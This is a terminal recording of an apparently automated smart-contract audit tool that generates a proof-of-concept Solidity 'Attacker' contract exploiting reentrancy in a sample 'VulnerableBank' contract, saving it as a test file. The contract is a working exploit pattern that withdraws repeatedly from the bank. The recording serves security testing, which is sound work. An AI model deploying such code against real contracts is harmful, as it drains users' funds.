[15.473832, "o", "\u001b[0;36m\u001b[1m[STEP 4/8]\u001b[0m \u001b[1mPoC Generation — Attack Simulation\u001b[0m"]
[15.473996, "o", "\r\n"]
[15.477251, "o", "\u001b[2m────────────────────────────────────────────────────────────────────────\u001b[0m\r\n"]
[16.477942, "o", "  \u001b[1;33m> athena poc --vuln reentrancy --target VulnerableBank\u001b[0m"]
[16.47834, "o", "\r\n"]
[17.481347, "o", "\r\n"]
[17.48175, "o", "\u001b[2m  // SPDX-License-Identifier: MIT"]
[17.48191, "o", "\r\n"]
[17.482021, "o", "  contract Attacker {"]
[17.482112, "o", "\r\n"]
[17.482231, "o", "      VulnerableBank bank;"]
[17.482314, "o", "\r\n"]
[17.482404, "o", "      function attack() external payable {"]
[17.482534, "o", "\r\n          bank.deposit{value: 1 ether}();"]
[17.482674, "o", "\r\n          bank.withdraw();  // triggers reentrancy"]
[17.482876, "o", "\r\n      }\r\n"]
[17.484723, "o", "      receive() external payable {\r\n          if (address(bank).balance >= 1 ether)\r\n              bank.withdraw();  // re-enter\r\n      }\r\n  }\u001b[0m\r\n\r\n  \u001b[0;32m[OK]\u001b[0m PoC generated → test/Attacker.t.sol\r\n"]
